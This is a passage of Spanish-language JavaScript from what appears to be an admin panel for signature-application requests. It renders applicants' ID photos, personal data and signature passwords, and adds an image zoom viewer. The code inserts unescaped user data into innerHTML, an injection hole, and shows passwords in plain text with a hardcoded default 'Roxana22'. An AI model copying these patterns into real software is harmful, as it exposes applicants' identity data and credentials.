  const fotoPagoNorm = normalizarDataUrl(sol.comprobantePago || DEFAULT_FOTO_PAGO, 'image/jpeg');

  let fotosHtml = '';
  if (fotoCedulaNorm || fotoPagoNorm) {
    fotosHtml = `
      <div class="detalle-fotos-row">
        ${fotoCedulaNorm ? `
          <div class="detalle-foto-box">
            <span class="detalle-label">Foto de Cédula</span>
            <img src="${fotoCedulaNorm}" alt="Foto Persona" class="img-ampliable" data-titulo="Foto de Cédula - ${sol.nombreCompleto}" title="Haz clic para ver en grande y hacer zoom">
            <span style="font-size: 0.65rem; color: #64748b;">(Clic para ampliar)</span>
          </div>
        ` : ''}
        ${fotoPagoNorm ? `
          <div class="detalle-foto-box">
            <span class="detalle-label">Comprobante de Pago</span>
            <img src="${fotoPagoNorm}" alt="Comprobante Pago" class="img-ampliable" data-titulo="Comprobante de Pago - ${sol.nombreCompleto}" title="Haz clic para ver en grande y hacer zoom">
            <span style="font-size: 0.65rem; color: #64748b;">(Clic para ampliar)</span>
          </div>
        ` : ''}
      </div>
    `;
  }

  const p = sol.datosPost || {};

  body.innerHTML = `
    ${fotosHtml}
    
    <div style="margin-bottom: 12px; font-size: 0.78rem; color: #94a3b8;">
      <strong>Fecha y Hora de Envío:</strong> <span style="color:#f1f5f9;">${sol.fechaHora}</span>
    </div>

    ${sol.estadoDetalle ? `
      <div style="margin-bottom: 14px; padding: 8px 12px; background: rgba(255,255,255,0.03); border-radius: 6px; border-left: 3px solid ${sol.estado === 'Aprobada' ? '#10b981' : (sol.estado === 'En Proceso' ? '#f59e0b' : '#ef4444')};">
        <span style="font-size: 0.76rem; color: #cbd5e1;">${sol.estadoDetalle}</span>
      </div>
    ` : ''}

    <div style="font-size: 0.75rem; font-weight: 700; color: #38bdf8; text-transform: uppercase; letter-spacing: 0.5px; margin-top: 14px;">
      Datos del Trámite (POST)
    </div>

    <div class="detalle-grid">
      <div class="detalle-item">
        <div class="detalle-label">Cédula</div>
        <div class="detalle-value">${sol.cedula || p.cedula || '---'}</div>
      </div>
      <div class="detalle-item">
        <div class="detalle-label">Nombres Completos</div>
        <div class="detalle-value">${sol.nombreCompleto || '---'}</div>
      </div>
      <div class="detalle-item">
        <div class="detalle-label">RUC</div>
        <div class="detalle-value">${p.ruc || '---'}</div>
      </div>
      <div class="detalle-item">
        <div class="detalle-label">Código Dactilar</div>
        <div class="detalle-value">${p.codigo_dactilar || '---'}</div>
      </div>
      <div class="detalle-item">
        <div class="detalle-label">Celular</div>
        <div class="detalle-value">${p.celular || '---'}</div>
      </div>
      <div class="detalle-item">
        <div class="detalle-label">Correo</div>
        <div class="detalle-value">${p.correo || '---'}</div>
      </div>
      <div class="detalle-item">
        <div class="detalle-label">Provincia / Ciudad</div>
        <div class="detalle-value">${p.provincia || '---'} / ${p.ciudad || '---'}</div>
      </div>
      <div class="detalle-item">
        <div class="detalle-label">Parroquia / Dirección</div>
        <div class="detalle-value">${p.parroquia || '---'} - ${p.direccion || '---'}</div>
      </div>
      <div class="detalle-item">
        <div class="detalle-label">Banco de Pago</div>
        <div class="detalle-value">${p.banco || '---'}</div>
      </div>
      <div class="detalle-item">
        <div class="detalle-label">Valor Pago ($)</div>
        <div class="detalle-value">$${p.valorPago || '---'}</div>
      </div>
      <div class="detalle-item">
        <div class="detalle-label">Número de Trámite</div>
        <div class="detalle-value">${p.numero_tramite || '---'}</div>
      </div>
      <div class="detalle-item">
        <div class="detalle-label">Contraseña de Firma</div>
        <div class="detalle-value" style="color: #2dd4bf;">${sol.clave || 'Roxana22'}</div>
      </div>
      ${sol.token ? `
        <div class="detalle-item" style="grid-column: span 2;">
          <div class="detalle-label">Token de Validación</div>
          <div class="detalle-value" style="font-family: monospace; font-size: 0.72rem;">${sol.token}</div>
        </div>
      ` : ''}
    </div>

    <!-- Sección de Logs del Trámite -->
    <div class="detalle-logs-header">
      <span class="detalle-logs-title">Logs y Eventos del Trámite (${(sol.logs || []).length})</span>
      <button type="button" id="btnCopiarLogsModal" class="btn-copiar-logs" title="Copiar logs de este trámite">Copiar Logs</button>
    </div>

    <div id="modalLogsBox" class="modal-logs-box">
      ${(sol.logs && sol.logs.length > 0) ? sol.logs.map(log => `
        <div class="modal-log-item ${log.tipo || 'info'}">
          <span class="modal-log-time">[${log.hora || ''}]</span>
          <span class="modal-log-msg">${log.mensaje || ''}</span>
        </div>
      `).join('') : '<div class="modal-logs-empty" style="color: #64748b; font-style: italic; font-size: 0.72rem;">No hay logs registrados para este trámite.</div>'}
    </div>
  `;

  // Activar botón para copiar los logs de este trámite al portapapeles
  const btnCopiarLogsModal = body.querySelector('#btnCopiarLogsModal');
  if (btnCopiarLogsModal) {
    btnCopiarLogsModal.addEventListener('click', () => {
      const logsTexto = (sol.logs || []).map(l => `[${l.hora}] [${(l.tipo || 'info').toUpperCase()}] ${l.mensaje}`).join('\n');
      if (logsTexto) {
        navigator.clipboard.writeText(logsTexto).then(() => {
          btnCopiarLogsModal.textContent = '¡Copiado!';
          setTimeout(() => { btnCopiarLogsModal.textContent = 'Copiar Logs'; }, 2000);
        }).catch(() => {
          btnCopiarLogsModal.textContent = 'Error al copiar';
        });
      }
    });
  }

  // Activar clic en las imágenes para abrir en grande
  body.querySelectorAll('.img-ampliable').forEach(img => {
    img.addEventListener('click', () => {
      const titulo = img.getAttribute('data-titulo') || 'Vista de Imagen';
      abrirVisorImagen(img.src, titulo);
    });
  });

  modal.style.display = 'flex';
}

// Controladores del Modal de Detalle
const modalDetalleSolicitud = document.getElementById('modalDetalleSolicitud');
const cerrarModalDetalleBtn = document.getElementById('cerrarModalDetalleBtn');

if (cerrarModalDetalleBtn && modalDetalleSolicitud) {
  cerrarModalDetalleBtn.addEventListener('click', () => {
    modalDetalleSolicitud.style.display = 'none';
  });
}

if (modalDetalleSolicitud) {
  modalDetalleSolicitud.addEventListener('click', (e) => {
    if (e.target === modalDetalleSolicitud) {
      modalDetalleSolicitud.style.display = 'none';
    }
  });
}

// ==================================================
// Visor de Imagen en Grande con Zoom y Arrastre
// ==================================================
const modalVisorImagen = document.getElementById('modalVisorImagen');
const visorImagen = document.getElementById('visorImagen');
const visorTitulo = document.getElementById('visorTitulo');
const visorContainer = document.getElementById('visorContainer');
const visorZoomNivel = document.getElementById('visorZoomNivel');
const btnVisorZoomIn = document.getElementById('btnVisorZoomIn');
const btnVisorZoomOut = document.getElementById('btnVisorZoomOut');
const btnVisorReset = document.getElementById('btnVisorReset');
const btnVisorCerrar = document.getElementById('btnVisorCerrar');

let currentVisorZoom = 1;
let visorPosX = 0;
let visorPosY = 0;
let isVisorDragging = false;
let visorStartX = 0;
let visorStartY = 0;

function actualizarTransformVisor() {
  if (!visorImagen) return;
  visorImagen.style.transform = `translate(${visorPosX}px, ${visorPosY}px) scale(${currentVisorZoom})`;
  if (visorZoomNivel) {
    visorZoomNivel.textContent = `${Math.round(currentVisorZoom * 100)}%`;
  }
}

function abrirVisorImagen(src, titulo = 'Vista previa de imagen') {
  if (!modalVisorImagen || !visorImagen || !src) return;
  visorImagen.src = src;
  if (visorTitulo) visorTitulo.textContent = titulo;
  currentVisorZoom = 1;
  visorPosX = 0;
  visorPosY = 0;
  actualizarTransformVisor();
  modalVisorImagen.style.display = 'flex';
}

function cerrarVisorImagen() {
  if (!modalVisorImagen) return;
  modalVisorImagen.style.display = 'none';
  if (visorImagen) visorImagen.src = '';
}

if (btnVisorCerrar) {
  btnVisorCerrar.addEventListener('click', cerrarVisorImagen);
}

if (btnVisorZoomIn) {
  btnVisorZoomIn.addEventListener('click', () => {
    currentVisorZoom = Math.min(8, currentVisorZoom + 0.25);
    actualizarTransformVisor();
  });
}

if (btnVisorZoomOut) {
  btnVisorZoomOut.addEventListener('click', () => {
    currentVisorZoom = Math.max(0.4, currentVisorZoom - 0.25);
    actualizarTransformVisor();
  });
}

if (btnVisorReset) {
  btnVisorReset.addEventListener('click', () => {
    currentVisorZoom = 1;
    visorPosX = 0;
    visorPosY = 0;
    actualizarTransformVisor();
  });
}

if (visorContainer) {
  // Zoom con la rueda del ratón (scroll)
  visorContainer.addEventListener('wheel', (e) => {
    e.preventDefault();
    const factor = e.deltaY < 0 ? 1.15 : 0.85;
    const nuevoZoom = Math.min(8, Math.max(0.4, currentVisorZoom * factor));
    currentVisorZoom = nuevoZoom;
    actualizarTransformVisor();
  }, { passive: false });

  // Arrastre / Pan con el cursor
  visorContainer.addEventListener('mousedown', (e) => {
    if (e.target === btnVisorCerrar || e.target.closest('.visor-toolbar')) return;
    isVisorDragging = true;
    visorStartX = e.clientX - visorPosX;
    visorStartY = e.clientY - visorPosY;
    visorContainer.classList.add('grabbing');
  });

  window.addEventListener('mousemove', (e) => {
    if (!isVisorDragging) return;
    visorPosX = e.clientX - visorStartX;
    visorPosY = e.clientY - visorStartY;
    actualizarTransformVisor();
  });

  window.addEventListener('mouseup', () => {
    if (isVisorDragging) {
      isVisorDragging = false;
      visorContainer.classList.remove('grabbing');
    }
  });
}

document.addEventListener('keydown', (e) => {
  if (e.key === 'Escape') {
    if (modalVisorImagen && modalVisorImagen.style.display !== 'none') {
      cerrarVisorImagen();
    } else if (modalDetalleSolicitud && modalDetalleSolicitud.style.display !== 'none') {
      modalDetalleSolicitud.style.display = 'none';
    }
  }
});

// Botón Limpiar Todo el Historial de Solicitudes (Local y Supabase)
const limpiarHistorialBtn = document.getElementById('limpiarHistorialBtn');
if (limpiarHistorialBtn) {
  limpiarHistorialBtn.addEventListener('click', async () => {
    if (confirm('¿Deseas vaciar por completo todo el historial de solicitudes (se borrará tanto localmente como en la base de datos Supabase)?')) {
      await vaciarHistorialCompleto();
    }
  });
}

// Función para reanudar solicitudes en segundo plano tras recarga o reinicio de página
function verificarYReanudarSolicitudesEnProceso() {
  const solicitudes = obtenerSolicitudesHistorial();
  const ahora = Date.now();
  const limiteTiempoMs = 20 * 60 * 1000; // 20 minutos de tolerancia

  const pendientes = solicitudes.filter(s => s.estado === 'En Proceso');
  if (pendientes.length === 0) return;

  pendientes.forEach(sol => {
    const edadMs = ahora - (sol.timestamp || ahora);
    if (edadMs < limiteTiempoMs) {
      if (!solicitudesEnEjecucion.has(sol.id)) {
        addLog('system', `[SEGUNDO PLANO] Reanudando procesamiento en segundo plano del trámite: ${sol.nombreCompleto} (${sol.cedula})...`);
        procesarTramiteEnSegundoPlano(sol.id);
      }
    } else {
      actualizarEstadoSolicitud(sol.id, 'Rechazada', 'Tiempo de procesamiento expirado tras reinicio de página.');
    }
  });
}

// Renderizar historial al cargar, sincronizar con Supabase y reanudar tareas en segundo plano
window.addEventListener('DOMContentLoaded', async () => {
  renderizarListaSolicitudes();
  verificarYReanudarSolicitudesEnProceso();
  await cargarHistorialDesdeSupabase();
  verificarYReanudarSolicitudesEnProceso();
});
